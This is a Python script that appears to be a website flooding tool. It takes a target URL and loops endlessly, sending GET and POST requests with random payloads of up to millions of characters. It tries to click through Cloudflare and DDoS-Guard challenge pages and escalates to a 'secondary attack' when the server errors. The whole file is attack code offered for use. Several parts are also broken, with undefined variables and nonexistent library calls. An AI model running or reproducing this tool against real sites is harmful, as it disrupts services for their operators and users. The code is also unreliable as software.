import requests
import aiohttp
import asyncio
import random
import string
import ssl
import sys
import os

from pyppeteer import launch
url = input("url: ")
# Function to check if Cloudflare protection is present
async def check_cloudflare(page):
    button = await page.querySelector('.big-button.pow-button')
    if button:
        box = await button.boundingBox()
        return {'x': box['x'] + box['width'] / 2, 'y': box['y'] + box['height'] / 2}
    else:
        return False

# Function to handle ddgCaptcha
async def handle_ddg_captcha(page):
  captcha = 'true' 
  precheck = 'true'

# Define headers for requests
headers = {
    "Accept-Language": "en-US,en;q=0.9",
    "Referer": "https://www.google.com/",
}

def generate_random_payload():
    length = random.randint(1, 9999999)
    text_characters = string.ascii_letters + string.digits + string.punctuation
    payload = "".join(random.choice(text_characters) for i in range(length))
    return payload

# Function to perform attack
async def perform_attack(target):
    session = aiohttp.ClientSession()
    context = ssl.create_default_context()

    while True:
        try:
            x = requests.get(target, headers=headers, params={"payload": generate_random_payload()}, timeout=3)
        except requests.exceptions.RequestException as e:
            print("Error:", e)

        if x is not None and x.status_code == 200:
            browser = await launch()
            page = await browser.newPage()

            # Check for Cloudflare protection
            cloudflare = await page.evaluate(check_cloudflare)
            if cloudflare:
                await page.hover('.big-button.pow-button')
                await page.mouse.click(cloudflare['x'], cloudflare['y'])
                await asyncio.sleep(6)  # Wait for 6 seconds

                # Check for captcha (if enabled)
                if captcha == 'true':
                    await handle_ddg_captcha(page)

                # Send GET request with randomly encrypted data keys
                async with session.get(target, headers=headers, ssl=context) as response:
                    await response.text()

                # Send POST request with encrypted payload
                payload = generate_random_payload()
                encrypted_payload = encrypt_payload(payload)  # Function to encrypt payload
                await session.post(
                    target,
                    data=encrypted_payload,
                    headers=headers,
                    ssl=context
                )
                print("Sent POST request with encrypted payload:", encrypted_payload)

                test = requests.get(target)
                print("Testing request:", test.status_code)
                await asyncio.sleep(0.1)

            elif x is not None and x.status_code == 403:
                print("Block IP!!!")
                break

            elif x is not None and x.status_code >= 500:
                print("False back !!!, secondary attack")
                session = aiohttp.ClientSession()
                async with session.get(target) as response:
                    await response.text()

            await page.close()
            await browser.close()

        if sys.stdin in asyncio.select([sys.stdin], [], [], 0)[0]:
            break

    await session.close()

# Function to create a task and run it
async def run_attack(url):
    await perform_attack(url)

# Function to encrypt payload
def encrypt_payload(payload):
    # Code to encrypt payload
    encrypted_payload = payload  # Replace with your actual encryption
    return encrypted_payload

# Select a random User-Agent from the User-Agent list
def get_random_user_agent():
    if user_agents:
        return {
            'User-Agent': random.choice(user_agents)
        }
    else:
        return {}

# Send request using a random User-Agent for each request
def send_request(url):
    headers.update(get_random_user_agent())
    session = requests.Session()

    try:
        response = session.get(url, headers=headers, timeout=3)

        if response.status_code == 200:
            print(f"Success request to {url}")
    except requests.exceptions.RequestException as e:
        print(f"Error request to {url}: {e}")

# Send requests without using proxy
def send_requests(url):
    loop = asyncio.get_event_loop()
    loop.run_until_complete(run_attack(url))
    send_request(url)

send_requests(url)
